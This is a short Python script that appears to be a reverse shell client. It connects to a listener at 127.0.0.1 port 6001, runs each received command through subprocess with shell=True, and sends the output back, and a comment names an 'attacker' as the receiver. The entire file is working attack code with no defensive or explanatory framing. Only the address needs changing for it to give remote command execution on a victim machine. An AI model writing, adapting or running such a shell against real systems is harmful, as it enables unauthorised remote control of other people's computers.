import socket
import subprocess
#hst = socket.gethostname()
#print(socket.gethostbyaddr(hst))

host = '127.0.0.1'
port = 6001
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    # while loop to ensure system keeps receiving data
    while True:
        data = s.recv(1024)
        # subprocess used to send attacker output of cmds & due to bytes
        # needing to be sent using sendall
        cmd = subprocess.check_output(data.strip(), shell=True)
        s.sendall(cmd.strip())
        s.sendall(b'\n')


